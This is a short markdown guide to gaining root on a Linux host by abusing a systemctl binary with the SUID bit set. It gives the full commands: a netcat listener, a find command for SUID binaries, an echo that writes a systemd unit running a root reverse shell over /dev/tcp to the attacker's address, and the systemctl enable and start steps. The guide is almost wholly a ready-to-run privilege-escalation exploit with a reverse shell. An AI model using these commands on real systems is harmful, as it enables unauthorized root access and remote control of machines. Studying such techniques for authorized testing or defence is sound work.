# Expected conditions for **systemctl** exploit:
1. Having access to shell with non-root user.
2. Having netcat listener running locally on a random port:
<a name="netcat-section"></a>
```
nc -lvp 9999
```
1. **systemctl** command has SUID bit set.
   1. To check commands with SUID bit:
      ```
      find / -user root -perm -4000 -exec ls -ldb {} \;
      ```
      * **find** - search for
      * **/** - start search from root directory
      * **-user root** - condition saying that user must be root
      * **-perm 4000** - condition saying that file should have SUID bit set
      * **-exec** - execute command on each file that meets conditions
        * **ls -ldb** - execute **ls** command with attributes
        * **{}** - output placeholder
        * **\;** - the end of the -exec command

## Usage
1. Paste the below echo command in the remote shell:
```shell
echo "
[Unit]
Description=access root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ip-address>/9999 0>&1'

[Install]
WantedBy=multi-user.target" >> /tmp/test.service
```
* Above echo saves **test.service** service into temporary file.
* **[Unit]** header that contains Description attribute of the service. Description can by anything.
* **[Service]** header contains **Type** attribute equal to **Simple** which tells service manager that service starts immediately after the main service process has been forked off. **ExecStart** attribute describes what command are executed when the service is started:
  ```
  /bin/bash -c 'bash -i >& /dev/tcp/<ip-address>/9999 0>&1'
  ```
  * **/bin/bash -c ''**: run command with bash
  * **bash -i**: starts bash in interactive mode
  * **>&**: redirect standard output and error
  * **/dev/tcp/<ip-address>/9999**: into special device file that allows to create TCP socket with your IP address under specific port number [(used previously in netcat listener)](#netcat-section)
  * **0>&1**: redirect standard input (0 file descriptor) where the standard input (1 file descriptor) is redirected - which is TCP socket

2. Enable service:
```sh
systemctl enable /tmp/test.service
```
3. Start service:
```sh
systemctl start test
```
'

